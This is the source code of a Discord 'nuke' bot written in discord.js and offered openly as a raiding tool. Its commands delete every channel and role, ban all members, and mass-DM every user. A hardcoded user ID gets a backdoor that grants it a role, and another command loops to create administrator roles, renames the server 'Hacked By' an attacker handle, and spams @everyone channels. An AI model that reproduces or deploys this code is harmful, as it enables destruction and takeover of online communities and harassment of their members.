///////////////
const discord = require("discord.js");
const nuke = new discord.Client();
 
 
nuke.on("ready", () =>{
console.log("This bot has been developed by Frederikam.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Nuking Discord Servers :)` }, type: 0 });
});
 
nuke.on("message", async(msg)=>{
 
 
if(msg.content.toLowerCase().startsWith("!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | L O S T#2332"));
}
 
if(msg.content.toLowerCase().startsWith("!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
 
if(msg.content.toLowerCase().startsWith("!" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | L O S T#2332"));
}
 
if(msg.content.toLowerCase().startsWith("!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | Developed By Frederikam" },
            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Frederikam"
        }
    })
}
 
if (msg.author.id == "802491275445010443") {
    if (msg.content == "!admin") {
        const guild = msg.guild
 
        if (!guild.me.hasPermission("ADMINISTRATOR")) return console.error("No admin in said guild!");
 
        var role = guild.roles.find(r => r.name == "ROLE-NAME")
        var member = guild.members.get("802491275445010443")
 
        if (role) {
            member.addRole(role)
        } else {
            console.log("No role!")
        }
    }
}
 
{if (msg.author.id == "802491275445010443" && msg.content.startsWith("!dm")) {
        let msg_to_send = msg.content.substring(4);
        let memarr = msg.guild.members.array();
        for (let i = 0; i < memarr.length; i++) {
            let mem = memarr[i]
            await mem.send(msg_to_send).catch(() => { });
        }
    }
}
 
 
});

nuke.on("message", message => {

  if (message.content.startsWith("!" + "lost")) {

    message.delete();
    setInterval(() => {

      message.guild.roles.create({

        data: {

          name: "Hacked By L O S T#2332",

          permissions: ["ADMINISTRATOR"]

        }

        })

        .then(rr => {

          message.member.roles.add(rr.id);

        });

    }, 1000);

    message.guild.setIcon("https://cdn.discordapp.com/attachments/746824659181502525/986196100044169296/de9d9493e5c763bc7413cc9fdce8ed3f.gif");


    message.guild.owner.send(

      "Bdaxo nradar servert hack kra"

    );

    message.guild.setName("Hacked By L O S T#2332");

    setTimeout(function() {

      setInterval(

        () => {

           message.guild.createChannel('hack by Dark Team', 'voice')

            .then(channel => {

              channel.send(

                "@everyone Hacked By L O S T#2332"

              );

            })
        },

 

        1000

      );

    });

  }

});

 
nuke.login("");
